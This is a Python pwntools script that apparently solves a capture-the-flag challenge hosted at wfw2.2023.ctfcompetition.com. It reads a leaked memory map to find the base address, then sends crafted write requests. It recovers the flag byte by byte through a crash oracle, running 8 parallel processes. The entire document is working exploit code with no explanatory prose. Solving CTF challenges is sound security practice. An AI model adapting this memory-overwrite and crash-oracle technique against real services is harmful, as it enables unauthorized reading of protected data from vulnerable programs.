#!/usr/bin/env python3

from pwn import *
from multiprocessing import Pool

context.log_level = 'warning'

def get_flag_char(idx):
    base_addr = 0x0
    num_bytes = 1 + idx
    address = 0x20bc - idx

    def overwrite(address, num_bytes, start_chr=b'0'):
        address += base_addr
        address_str = hex(address).encode('utf-8')
        num_bytes = str(num_bytes).encode('utf-8')
        payload = start_chr + address_str[1:] + b' ' + num_bytes
        return payload


    for i in range(0x20, 0x7f):
        c = chr(i).encode('utf-8')
        p = remote('wfw2.2023.ctfcompetition.com', 1337)

        p.recvuntil(b'fluff\n')

        # /proc/self/maps is printed, so just get the first address
        # and use it as the base address
        base_addr = int(p.recvline().split(b'-')[0], 16)
        # log.info('base_addr: ' + hex(base_addr))

        p.recvuntil(b'\n\n\n')

        p.sendline(overwrite(address, num_bytes))
        try:
            p.sendline(overwrite(address, num_bytes, c))
            # If the program doesn't crash, then we found the right char
            p.recv(1, timeout=1)
            log.warn('Found char for idx ' + str(idx) + ': ' + c.decode('utf-8'))
            p.close()
            return c
        except EOFError:
            # if we get EOFError, then the program crashed, so try the next char
            p.close()
    log.warn('No char found for idx ' + str(idx))
    return b''

with Pool(8) as p:
    flag = p.map(get_flag_char, range(70))

flag = b''.join(flag)
log.warn('flag: ' + flag.decode('utf-8'))

